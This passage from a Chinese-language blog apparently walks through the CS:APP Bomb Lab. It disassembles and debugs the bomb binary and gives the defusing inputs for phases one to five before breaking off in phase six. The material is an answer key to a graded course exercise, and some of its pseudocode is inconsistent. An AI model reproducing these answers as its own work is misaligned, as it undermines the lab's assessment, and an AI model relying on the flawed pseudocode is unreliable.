&gt; strings.txt</span><br></pre></td></tr></table></figure><p>将数据存储在strings.txt中以便后续使用。</p><h4 id="3整体逻辑分析"><a class="markdownIt-Anchor" href="#3整体逻辑分析"></a> 3.整体逻辑分析</h4><p>定位到其<code>main</code>的函数的字段，分析其执行逻辑，观察到如下代码段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">400e19:e8 84 05 00 00       call   4013a2 &lt;initialize_bomb&gt;</span><br><span class="line">400e1e:bf 38 23 40 00       mov    $0x402338,%edi</span><br><span class="line">400e23:e8 e8 fc ff ff       call   400b10 &lt;puts@plt&gt;</span><br><span class="line">400e28:bf 78 23 40 00       mov    $0x402378,%edi</span><br><span class="line">400e2d:e8 de fc ff ff       call   400b10 &lt;puts@plt&gt;</span><br><span class="line">400e32:e8 67 06 00 00       call   40149e &lt;read_line&gt;</span><br></pre></td></tr></table></figure><p>在这里是炸弹的初始化阶段，<code>edi</code>寄存器用于传递参数作为存储数据的位置，也就是说这里是输出程序的第一个炸弹提示语的地方，我们可以通过<code>gdb</code>进行验证。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb bomb</span><br></pre></td></tr></table></figure><p>进入gdb界面后我们通过<code>b main</code>将断点设置在<code>main</code>开始处，并通过<code>r</code>，执行到断点处。执行如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x402338</span><br><span class="line">0x402338:   <span class="string">&quot;Welcome to my fiendish little bomb. You have 6 phases with&quot;</span></span><br></pre></td></tr></table></figure><p>验证和推理一致，我同样可以在Strings.txt中找到这个字符串，这样我们就知道几个工具的用途，接下来就需要灵活应用来拆除炸弹了。</p><h3 id="phase_1"><a class="markdownIt-Anchor" href="#phase_1"></a> phase_1</h3><p>第一个密码的破解我们首先定位到main函数中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400e32:e8 67 06 00 00       call   40149e &lt;read_line&gt;</span><br><span class="line">400e37:48 89 c7             mov    %rax,%rdi</span><br><span class="line">400e3a:e8 a1 00 00 00       call   400ee0 &lt;phase_1&gt;</span><br></pre></td></tr></table></figure><p>以下部分是对程序的深入探索，单纯解题可以跳到分割线后。</p><hr /><p>我们知道这里将这里将函数<code>read_line</code>的返回值地址作为函数<code>phase_1</code>的参数传递</p><p>先看到函数<code>read_line</code>，根据函数名我们大致推测这是简单读入一行字符，但是不知道是否还有其他操作。根据其中调用的函数<code>skip</code>理解其含义（理解的过程中可以对照table.txt中的变量确定大小和位置,借用gdb确定其值），将<code>skip</code>写出伪代码大概如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">skip()&#123;</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">  <span class="comment">//这里有一段很令人迷惑的汇编会在最后彩蛋部分解释</span></span><br><span class="line">...</span><br><span class="line">    rdi = <span class="number">0x603780</span>;</span><br><span class="line">    rdx = (<span class="built_in">stdin</span>);</span><br><span class="line">    esi = <span class="number">80</span>;</span><br><span class="line">    <span class="comment">// 如果读到函数会返回地址，如果未读到返回空</span></span><br><span class="line">    rax= fgets(addr= rdi, size= esi, stream = rdx); </span><br><span class="line">    rbx = rax;</span><br><span class="line">    <span class="keyword">if</span>(rax == <span class="number">0</span>) <span class="keyword">break</span>; <span class="comment">//没有读到行</span></span><br><span class="line">    rdi = rax;</span><br><span class="line">    eax = blank_line(rdi); <span class="comment">//判断是否为空行</span></span><br><span class="line">  &#125;<span class="keyword">while</span>(eax != <span class="number">0</span>)</span><br><span class="line">  rax = rbx;</span><br><span class="line">  <span class="keyword">return</span> rax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>skip</code>会自动跳过空行读取到第一个有数据的行，或者错误的行。</p><p><strong>read_line()有大量代码用于检测各种输入问题，同时隐藏细节，在彩蛋部分会解释，这里只需要知道这是一个读入一行字符串的函数即可</strong></p><hr /><p>接下来正式进入<code>phase_1</code>的代码</p><p>我们发现在调用<code>strings_not_equal</code>时，他仅仅是将<code>0x402400</code>传递给第二个参数<code>esi</code>，而第一个参数是传入函数的参数可以写出如下伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">phase_1(rdi)&#123;</span><br><span class="line">esi = <span class="number">0x402400</span>;</span><br><span class="line">eax = strings_not_equals(rdi, esi);</span><br><span class="line"><span class="keyword">if</span>(eax != <span class="number">0</span>)&#123;</span><br><span class="line">explode_bomb(); <span class="comment">//爆炸</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到<code>strings_not_equals</code>的代码可以转化为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">strings_not_equals(rdi, rsi)&#123;</span><br><span class="line"><span class="comment">//第一个字符串</span></span><br><span class="line">rbx = rdi;</span><br><span class="line"><span class="comment">//第二个字符串</span></span><br><span class="line">rbp = rsi;</span><br><span class="line">eax = string_length(rdi);</span><br><span class="line"><span class="comment">//r12d 存长度</span></span><br><span class="line">r12d = eax;</span><br><span class="line">rdi = rbp;</span><br><span class="line">eax = string_length(rdi);</span><br><span class="line">  <span class="keyword">if</span>(eax != r12d) retrun eax = edx = <span class="number">1</span>;</span><br><span class="line">eax = *(rbx);</span><br><span class="line"><span class="keyword">for</span>(al != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(al != *(rbp)) retrun eax = edx = <span class="number">1</span>;</span><br><span class="line">rbx++;</span><br><span class="line">rbp++;</span><br><span class="line">eax = *(rbx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> eax = edx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是正常的判断是否相等的代码。</p><p>所有只需要通过gdb找到<code>0x402400</code>位置的字符串即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x402400</span><br><span class="line">0x402400:       <span class="string">&quot;Border relations with Canada have never been better.&quot;</span></span><br></pre></td></tr></table></figure><p>这个字符串即结果</p><h3 id="phase_2"><a class="markdownIt-Anchor" href="#phase_2"></a> phase_2</h3><p>调用函数前的过程详见<em>phase_1</em>的解析，我们直接关注到调用的函数内部。</p><p>函数中调用<code>read_six_number</code>函数的解析如下</p><p>这个函数其实让我们看到机器在参数多于寄存器能表达的数量是所做的工作，利用栈来保存结果指针的位置。该函数所做的工作就是将<code>rsi</code>传递过来的参数（也就是需要存储的指针）分别存在6个变量中以便<code>sscanf</code>调用时能够存储到正确的位置。</p><p>首先我们看到sscanf的声明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sscanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> str, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...)</span>;</span><br></pre></td></tr></table></figure><p>而这里传递的第二个参数对应于<code>format</code>,我们通过<code>gdb</code>查看对应的寄存器<code>$esi</code>位置<code>0x4025c3</code>可知</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x4025c3</span><br><span class="line">0x4025c3:       <span class="string">&quot;%d %d %d %d %d %d&quot;</span></span><br></pre></td></tr></table></figure><p>所需要解析的是6个32位整数，对应每个变量大小为4B，也和代码中以4B为基准将指针记入寄存器相同。</p><p>我们可以看到6个整数指针的对应关系如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str$rdi</span><br><span class="line">format$rsi</span><br><span class="line">arg0$rdx</span><br><span class="line">arg1$rcx</span><br><span class="line">arg2$r8</span><br><span class="line">arg3$r9</span><br><span class="line">arg4($rsp)</span><br><span class="line">arg5($rsp + 8)</span><br></pre></td></tr></table></figure><p>这样就能把6个整数从字符串中解析到指针<code>$rsi</code>所指向的地址中，下面看回<code>phase_2</code>可以表示为如下伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">phase_2(rdi)&#123;</span><br><span class="line">rsi = rsp;</span><br><span class="line">read_six_numbers(rdi, rsi); <span class="comment">//将6个数据从rdi字符串中读入rsp位置中</span></span><br><span class="line"><span class="keyword">if</span>(rsp[<span class="number">0</span>] != <span class="number">1</span>) &#123;</span><br><span class="line">explode_bomb();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;<span class="number">6</span>; ++i)&#123;</span><br><span class="line"><span class="keyword">if</span>(rsp[i] != rsp[i<span class="number">-1</span>] + rsp[i<span class="number">-1</span>])&#123;</span><br><span class="line">explode_bomb();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有可以知道第二个密码应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 4 8 16 32</span><br></pre></td></tr></table></figure><h3 id="phase_3"><a class="markdownIt-Anchor" href="#phase_3"></a> phase_3</h3><p>开始读取两个整数的操作和<code>phase_2</code>完全相同，后面的部分核心的语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">400f75: ff 24 c5 70 24 40 00  jmp    *0x402470(,%rax,8)</span><br></pre></td></tr></table></figure><p>我们在<code>gdb</code>里打印对应内存信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x *0x402470</span><br><span class="line">0x400f7c &lt;phase_3+57&gt;:  0xb8</span><br></pre></td></tr></table></figure><p>说明这里对应的就是<code>&lt;phase_3+57&gt; + 8 * $rax</code>，而观察发现下面的代码正好每两行占用内存空间为8B，所有这就是一个switch语句。伪代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">phase_3(rdi)&#123;</span><br><span class="line">rdx = rsp + <span class="number">8</span>;</span><br><span class="line">rcx = rsp + <span class="number">12</span>;</span><br><span class="line">rax = <span class="built_in">sscanf</span>(rdi, rsi, rdx, rcx);</span><br><span class="line"><span class="keyword">if</span>(rax &gt; <span class="number">1</span> &amp;&amp; (rsp+<span class="number">8</span>) &gt; <span class="number">7</span>)&#123;</span><br><span class="line"><span class="keyword">switch</span>((rax))&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">eax = <span class="number">0xcf</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">..  <span class="comment">//后续省略</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( (rsp + <span class="number">12</span>) != eax)&#123;</span><br><span class="line">explode_bomb();</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">explode_bomb();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有本题的答案有八组，任意选择其中的一组即可，我选择 <code>0 207</code></p><h3 id="phase_4"><a class="markdownIt-Anchor" href="#phase_4"></a> phase_4</h3><p>本题前面读入两个整数的过程和<code>phase_3</code>相同，为便于分析逻辑可以直接替换变量名，容易转换为如下形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">phase_4(str)&#123;</span><br><span class="line"><span class="built_in">sscanf</span>(str, <span class="string">&quot;%d %d&quot;</span>, a, b);</span><br><span class="line"><span class="keyword">if</span>(a &gt; <span class="number">15</span>)&#123;</span><br><span class="line">explode_bomb();</span><br><span class="line">&#125;</span><br><span class="line">ans = func4(a, <span class="number">0</span>, <span class="number">15</span>);</span><br><span class="line"><span class="keyword">if</span>(ans != <span class="number">0</span> || b != <span class="number">0</span>)&#123;</span><br><span class="line">explode_bomb();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面重点放在<code>func4</code>函数中，我们看到这个函数需要三个参数，分析函数后可以将其转化为以下递归函数，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">func4(rdi, rsi, rdx)&#123;</span><br><span class="line">eax = (rdx) - (rsi);</span><br><span class="line">ecx = (<span class="type">unsigned</span>)(eax) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">eax += ecx;</span><br><span class="line">eax &gt;&gt; <span class="number">1</span>;</span><br><span class="line">ecx = rax + rsi + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(ecx &lt;= edi)&#123;</span><br><span class="line">rdx = rcx - <span class="number">1</span>;</span><br><span class="line">rax = func4(rdi, rsi, rdx);</span><br><span class="line">rax = rax * <span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(ecx == edi)&#123;</span><br><span class="line">rax = <span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    esi = rcx + <span class="number">1</span>;</span><br><span class="line">    rax = func4(rdi, rsi, rdx);</span><br><span class="line">    rax = rax * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在根据调用是的限制条件知道可以转化为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">func4(x, y, z)&#123;</span><br><span class="line">tmp = z - y + (z &lt; y ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">tmp &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">tmp += y;</span><br><span class="line"><span class="comment">//tmp 实际上就是 (y + z) / 2;</span></span><br><span class="line"><span class="keyword">if</span>(tmp &gt; x)&#123;</span><br><span class="line">ans = func4(x, y, tmp - <span class="number">1</span>);</span><br><span class="line">ans = ans * <span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(tmp == x)&#123;</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    ans = func4(x, tmp + <span class="number">1</span>, z);</span><br><span class="line">    ans = ans * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出其实就是一个二分查找的算法，而让ans为0的方法是，始终保证<code>x</code>，在中值的左边，直到找到中间值为<code>x</code>时。</p><p>始终选择左边的中间值如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">( 0 + 15 ）/ 2 = 7</span><br><span class="line">( 0 + 7  ) / 2 = 3</span><br><span class="line">( 0 + 3  ) / 2 = 1</span><br><span class="line">( 0 + 1  ) / 2 = 0</span><br></pre></td></tr></table></figure><p>所有最终第一个数可以是<code>7,3,1,0</code>，第二个数为<code>0</code></p><h3 id="phase_5"><a class="markdownIt-Anchor" href="#phase_5"></a> phase_5</h3><p>本题有一点真正破解的的感觉了，通过汇编代码会发现，整个过程分为三个阶段，我将逐一解释，为方便起见，我会给字符串以<code>a,b,c</code>命名。</p><h4 id="1-确保读入的字符串a长度为6并进入一个循环"><a class="markdownIt-Anchor" href="#1-确保读入的字符串a长度为6并进入一个循环"></a> 1. 确保读入的字符串a长度为6，并进入一个循环</h4><p>这里的代码没有什么特别的，但是有一个与解题无关的小细节小细节，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">40106a:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax</span><br><span class="line">401071:00 00 </span><br><span class="line">401073:48 89 44 24 18       mov    %rax,0x18(%rsp)</span><br><span class="line">...</span><br><span class="line">4010de:64 48 33 04 25 28 00 xor    %fs:0x28,%rax</span><br><span class="line">4010e5:00 00 </span><br><span class="line">4010e7:74 05                je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">4010e9:e8 42 fa ff ff       call   400b30 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>这里实际上是在栈中偏移为<code>0x18</code>的地方放置一个用于验证的验证码，确保在函数返回是能找到正确的返回地址，防止出现通过读入字符串而破坏栈，从而植入非法地址的问题。</p><h4 id="2-通过a获取新字符串"><a class="markdownIt-Anchor" href="#2-通过a获取新字符串"></a> 2. 通过a获取新字符串</h4><p>核心代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">40108b:0f b6 0c 03          movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:88 0c 24             mov    %cl,(%rsp)</span><br><span class="line">401092:48 8b 14 24          mov    (%rsp),%rdx</span><br><span class="line">401096:83 e2 0f             and    $0xf,%edx</span><br><span class="line">401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)</span><br></pre></td></tr></table></figure><p>我们可以看到，其中<code>rax</code>相当于字符串的偏移量，取出的字符串也只需要其低位的字，又以该字为偏移量到<code>0x4024b0</code>中取出一个字，并放在栈中的指定位置。</p><p>我们通过gdb打印出<code>0x4024b0</code>处的字符串（可以看作是一个对应的哈希表）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x4024b0</span><br><span class="line">0x4024b0 &lt;array.3449&gt;:  <span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span></span><br></pre></td></tr></table></figure><p>我们指需要前16个字符，因为取出低位最多访问16个字符</p><p>抽象出的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> * str = <span class="string">&quot;xxxxxx&quot;</span> <span class="comment">//输入的字符串</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * hash = <span class="string">&quot;maduiersnfotvbyl&quot;</span>; <span class="comment">//0x4024b0</span></span><br><span class="line"><span class="type">char</span> ans[<span class="number">7</span>]; <span class="comment">//0x10(%rsp)</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)&#123;</span><br><span class="line">  ans[i] = hash[str[i] &amp; <span class="number">0xf</span>];</span><br><span class="line">&#125;</span><br><span class="line">ans[<span class="number">6</span>] = <span class="string">&#x27;\0&#x27;</span>;  <span class="comment">//4010ae: movb   $0x0,0x16(%rsp)</span></span><br></pre></td></tr></table></figure><h4 id="3-比较生成的字符串和秘密表"><a class="markdownIt-Anchor" href="#3-比较生成的字符串和秘密表"></a> 3. 比较生成的字符串和秘密表</h4><p>最终的密码放在<code>0x40245e</code>的位置处，通过<code>gdb</code>可知为<code>flyers</code>，因此只要能让我们输入的字符串作为键产生相应的值即可。具体如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;f&#x27; &lt;=&gt; hash[0x9]</span><br><span class="line">&#x27;l&#x27; &lt;=&gt; hash[0xd]</span><br><span class="line">&#x27;y&#x27; &lt;=&gt; hash[0xc]</span><br><span class="line">&#x27;e&#x27; &lt;=&gt; hash[0x5]</span><br><span class="line">&#x27;r&#x27; &lt;=&gt; hash[0x6]</span><br><span class="line">&#x27;s&#x27; &lt;=&gt; hash[0x7]</span><br></pre></td></tr></table></figure><p>通过键入<code>man ascii</code>找到任意对应的值字符即可，我选择的是<code>IONEFG</code></p><h3 id="phase_6"><a class="markdownIt-Anchor" href="#phase_6"></a> phase_6</h3><p>在最开始的部分和<code>phase_2</code>一样通过字符串将6个整数读入栈中，接下来的代码将分为以下几个部分</p><h4 id="1-双重循环"><a class="markdownIt-Anchor" href="#1-双重循环"></a> 1. 双重循环</h4><p>首先看代码从<code> 0x40110e</code>到<code>0x401151</code>的部分。</p><p>这里的<code>r13</code>代表外层循环的位置，<code>r12d</code>代表外层指针索引，可以抽象为以代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> arr[<span class="number">6</span>]; <span class="comment">//6个数</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)&#123;</span><br><span class="line">  <span class="keyword">if</span>(arr[i] &lt; <span class="number">1</span> || arr[i] &gt; <span class="number">6</span>)&#123;</span><br><span class="line">    explode_bomb();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(j = i; j &lt; <span class="number">6</span>; ++j)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr[i] == arr[j])&#123;</span><br><span class="line">      explode_bomb();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明这6个数互不相同其都在[1,6]之间，也就是1到6的排列。<s>(难怪官方要限制测试数量，这里写个脚本暴力测试只需要最多5! = 120次就可以测出答案)</s></p><h4 id="2-数据修改"><a class="markdownIt-Anchor" href="#2-数据修改"></a> 2. 数据修改</h4><p>代码从<code> 0x401153</code>到<code>0x40116d</code>的部分，将数据都用7减去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">6</span>; ++i)&#123;</span><br><span class="line">  arr[i] = <span class="number">7</span> - arr[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3链表查询"><a class="markdownIt-Anchor" href="#3链表查询"></a> 3.链表查询</h4><p>代码从<code> 0x40116f</code>到<code>0x4011a9</code>的部分。</p><p>我们看到<code>rdx</code>存储的实际上是<code>0x6032d0</code>，而其变换方式是<code>mov    0x8(%rdx),%rdx</code>，也就是说将代码当前位置偏移8B位置下的数据作存入<code>rdx</code>中，实际上就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="type">long</span> data; <span class="comment">//数据为8B</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一个结构的链表的遍历方式。</p><p>而在代码中又通过<code>arr[i]</code>作为其控制遍历的位置，并将地址存入栈中，可以将这部分代码表示为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>*  <span class="title">keys</span>[6];</span> <span class="comment">//0x20(%rsp）</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">first</span> =</span> <span class="number">0x6032d0</span>; <span class="comment">//头结点位置</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">6</span>; ++i)&#123;</span><br><span class="line"><span class="type">int</span> times = arr[i] - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> * <span class="title">tmp</span> =</span> first;</span><br><span class="line"><span class="keyword">while</span>(times--)&#123;</span><br><span class="line">tmp = tmp -&gt; next;</span><br><span class="line">&#125;</span><br><span class="line">keys[i] = tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4将结点值重新赋值"><a class="markdownIt-Anchor" href="#4将结点值重新赋值"></a> 4.将结点值重新赋值</h4><p>代码从<code> 0x4011ab</code>到<code>0x4011d0</code>的部分。</p><p>在这里<code>rcx</code>可以理解为新链表的当前指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">current</span> =</span> keys[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">long</span> rdx = keys[i]-&gt;data;</span><br><span class="line">current-&gt;next-&gt;data = rdx;</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">if</span>(i &gt;= <span class="number">6</span>) <span class="keyword">break</span>;</span><br><span class="line">current = key[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步相当于将链表的值按照<code>keys</code>中的顺序重新赋值</p><h4 id="5判断结点是否满足关系"><a class="markdownIt-Anchor" href="#5判断结点是否满足关系"></a> 5.判断结点是否满足关系</h4><p>代码从<code> 